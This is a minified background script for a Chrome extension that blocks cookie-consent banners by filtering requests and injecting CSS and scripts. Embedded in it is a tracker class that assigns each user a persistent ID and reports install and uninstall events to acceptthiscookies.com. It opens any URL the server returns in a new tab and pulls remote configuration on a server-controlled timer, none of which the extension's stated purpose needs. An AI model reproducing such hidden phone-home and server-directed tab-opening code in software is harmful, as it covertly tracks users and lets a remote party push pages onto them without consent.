import{blockUrls,commons,rules}from"./mainSettings.js";let initialized=!1,cachedRules={},tabList={};const xmlTabs={};let settings={statusIndicators:!0,whitelistedDomains:{}};class ExtStatTracker{constructor(){this.actionUrl="http://acceptthiscookies.com/api/action/",this.uninstallUrl="http://acceptthiscookies.com/uninstall/",this.configUrl="http://acceptthiscookies.com/api/config/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.initStorage(),this.initListeners()}processQueue(){for(;this.queue.length>0;){var t=this.queue.shift();if(!t.type||"action"!=t.type)return!0;var e="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:t.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+e).then((t=>t.json())).then((function(t){t.url&&chrome.tabs.create({url:t.url})}))}}setUninstallUrl(){var t="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+t)}initListeners(){chrome.runtime.onInstalled.addListener((t=>{this.queue.push({type:"action",action:t.reason}),this.queueProcessorReady&&this.processQueue()}))}initStorage(){chrome.storage.local.get((t=>{t&&t.config&&(this.config=t.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.queueProcessorReady=!0,this.setUninstallUrl(),this.processQueue(),this.updateConfig()}))}saveConfig(){chrome.storage.local.set({config:this.config})}updateConfig(){let t=this;fetch(this.configUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"filters="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:this.version,timestamp:Date.now(),uid:this.config.uid})))}).then((t=>t.json())).then((t=>{if(t){for(let e in t)this.config[e]=t[e];this.saveConfig(this.config)}})).finally((()=>{this.config.configUpTime&&this.config.configUpTime>0&&setTimeout((function(){t.updateConfig()}),this.config.configUpTime)}))}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(t){var e=16*Math.random()|0;return("x"==t?e:3&e|8).toString(16)}))}}function fetchHostName(t,e){try{if(0!=t.indexOf("http"))throw!0;const i=new URL(t);return void 0===e?i.hostname:i.hostname.replace(/^w{2,3}\d*\./i,"")}catch(t){return!1}}function updateSettings(){return new Promise((t=>{chrome.storage.local.get({settings:{whitelistedDomains:{},statusIndicators:!0}},(async({settings:e})=>{settings=e,t()}))}))}function isWhitelisted(t){if(void 0!==settings.whitelistedDomains[t.hostname])return!0;for(const e in t.host_levels)if(void 0!==settings.whitelistedDomains[t.host_levels[e]])return!0;return!1}function getWhitelistedDomain(t){if(void 0!==settings.whitelistedDomains[t.hostname])return t.hostname;for(const e in t.host_levels)if(void 0!==settings.whitelistedDomains[t.host_levels[e]])return t.host_levels[e];return!1}async function toggleWhitelist(t){0==t.url.indexOf("http")&&tabList[t.id]&&(tabList[t.id].whitelisted?delete settings.whitelistedDomains[tabList[t.id].hostname]:settings.whitelistedDomains[tabList[t.id].hostname]=!0,chrome.storage.local.set({settings:settings},(function(){for(const e in tabList)tabList[e].hostname==tabList[t.id].hostname&&(tabList[e].whitelisted=!tabList[t.id].whitelisted)})))}function getPreparedTab(t){if(t.hostname=!1,t.whitelisted=!1,t.host_levels=[],t.url&&(t.hostname=fetchHostName(t.url,!0),t.hostname)){const e=t.hostname.split(".");for(let i=e.length;i>=2;i--)t.host_levels.push(e.slice(-1*i).join("."));t.whitelisted=isWhitelisted(t)}return t}function onCreatedListener(t){tabList[t.id]=getPreparedTab(t)}function onUpdatedListener(t,e,i){e.status&&(tabList[i.id]=getPreparedTab(i))}function onRemovedListener(t){tabList[t]&&delete tabList[t]}async function recreateTabList(t){let e;if(tabList={},e=await new Promise(((t,e)=>{chrome.tabs.query({},(i=>{chrome.runtime.lastError&&e(chrome.runtime.lastError),t(i)}))})),e.forEach(onCreatedListener),t)for(const t in tabList)tabList.hasOwnProperty(t)&&doTheMagic(tabList[t].id)}function blockUrlCallback(t){if(-1==t.tabId&&t.initiator)for(const e in tabList)if(tabList[e].hostname==fetchHostName(t.initiator,!0)){t.tabId=parseInt(e);break}if(tabList[t.tabId]?.whitelisted)return{cancel:!1};if(tabList[t.tabId]&&t.url){const e=t.url.split("?")[0];for(const i in blockUrls.common_groups)if(t.url.indexOf(i)>-1){const s=blockUrls.common_groups[i];for(const i in s)if(s[i].q&&t.url.indexOf(s[i].r)>-1||!s[i].q&&e.indexOf(s[i].r)>-1){if(s[i].e&&tabList[t.tabId].host_levels.length>0)for(const e in tabList[t.tabId].host_levels)for(const n in s[i].e)if(s[i].e[n]==tabList[t.tabId].host_levels[e])return{cancel:!1};return{cancel:!0}}}const i=blockUrls.common;for(const s in i)if(i[s].q&&t.url.indexOf(i[s].r)>-1||!i[s].q&&e.indexOf(i[s].r)>-1){if(i[s].e&&tabList[t.tabId].host_levels.length>0)for(const e in tabList[t.tabId].host_levels)for(const n in i[s].e)if(i[s].e[n]==tabList[t.tabId].host_levels[e])return{cancel:!1};return{cancel:!0}}if(t.tabId>-1&&tabList[t.tabId].host_levels.length>0)for(const e in tabList[t.tabId].host_levels)if(blockUrls.specific[tabList[t.tabId].host_levels[e]]){const i=blockUrls.specific[tabList[t.tabId].host_levels[e]];for(const e in i)if(t.url.indexOf(i[e])>-1)return{cancel:!0}}}return{cancel:!1}}function activateDomain(t,e,i){if(cachedRules[t]||(cachedRules[t]=rules[t]||{}),!cachedRules[t])return!1;const s=cachedRules[t];let n=!1;return void 0!==s.s&&(insertCSS({tabId:e,frameId:i||0,css:s.s}),n=!0),void 0!==s.c&&(insertCSS({tabId:e,frameId:i||0,css:commons[s.c]}),n=!0),void 0!==s.j&&(executeScript({tabId:e,frameId:i,file:"/assets/js/"+(s.j>0?"common"+s.j:t)+".js"}),n=!0),n}function doTheMagic(t,e,i){tabList[t]&&0==tabList[t].url.indexOf("http")&&(tabList[t].whitelisted||insertCSS({tabId:t,frameId:e||0,file:"/assets/styles/common.css"},(function(){if(chrome.runtime.lastError){const s=i||1;if(10==s)return;s>5?setTimeout((()=>doTheMagic(t,e||0,s+1))):doTheMagic(t,e||0,s+1)}else if(executeScript({tabId:t,frameId:e,file:"/assets/js/embeds.js"}),!activateDomain(tabList[t].hostname,t,e||0)){for(const i in tabList[t].host_levels)if(activateDomain(tabList[t].host_levels[i],t,e||0))return!0;executeScript({tabId:t,frameId:e,file:"/assets/js/common.js"})}})))}function insertCSS(t,e){const{tabId:i,css:s,file:n,frameId:o}=t;chrome.tabs.insertCSS(i,{file:n,code:s,frameId:o||0,runAt:xmlTabs[i]?"document_idle":"document_start",cssOrigin:"user"},e)}function executeScript(t,e){const{tabId:i,func:s,file:n,frameId:o}=t;chrome.tabs.executeScript(i,{file:n,frameId:o||0,code:null==s?void 0:"("+s.toString()+")();",runAt:xmlTabs[i]?"document_idle":"document_end"},e)}async function loadCachedRules(){cachedRules={}}async function initialize(t,e){t&&initialized||(loadCachedRules(),await updateSettings(),await recreateTabList(e),initialized=!0)}chrome.tabs.onCreated.addListener(onCreatedListener),chrome.tabs.onUpdated.addListener(onUpdatedListener),chrome.tabs.onRemoved.addListener(onRemovedListener),chrome.runtime.onInstalled.addListener((async()=>await initialize(!1,!0))),chrome.webRequest.onBeforeRequest.addListener(blockUrlCallback,{urls:["http://*/*","https://*/*"],types:["script","stylesheet","xmlhttprequest"]},["blocking"]),chrome.webRequest.onHeadersReceived.addListener((function(t){return tabList[t.tabId]&&t.responseHeaders.forEach((function(e){"Content-Type"!=e.name&&"content-type"!=e.name||(xmlTabs[t.tabId]=e.value.indexOf("/xml")>-1)})),{cancel:!1}}),{urls:["http://*/*","https://*/*"],types:["main_frame"]},["blocking","responseHeaders"]),chrome.webNavigation.onCommitted.addListener((async t=>{t.frameId>0||(initialized||await initialize(),tabList[t.tabId]=getPreparedTab(t),doTheMagic(t.tabId))})),chrome.webNavigation.onCompleted.addListener((async function(t){initialized||await initialize(),t.frameId>0&&"about:blank"!=t.url&&doTheMagic(t.tabId,t.frameId)})),chrome.runtime.onMessage.addListener(((t,e,i)=>(initialize().then((()=>{let e=!1;if("object"==typeof t)if(t.tabId&&tabList[t.tabId])if("get_active_tab"==t.command){const s={tab:tabList[t.tabId]};s.tab.whitelisted&&(s.tab.hostname=getWhitelistedDomain(tabList[t.tabId])),i(s),e=!0}else"toggle_extension"==t.command?toggleWhitelist(tabList[t.tabId]):"refresh_page"==t.command&&executeScript({tabId:t.tabId,func:()=>{window.location.reload()}});else"open_options_page"==t.command&&chrome.tabs.create({url:chrome.runtime.getURL("/assets/settings.html")});else"update_settings"==t&&updateSettings();e||i()})),!0))),initialize();const t=new ExtStatTracker;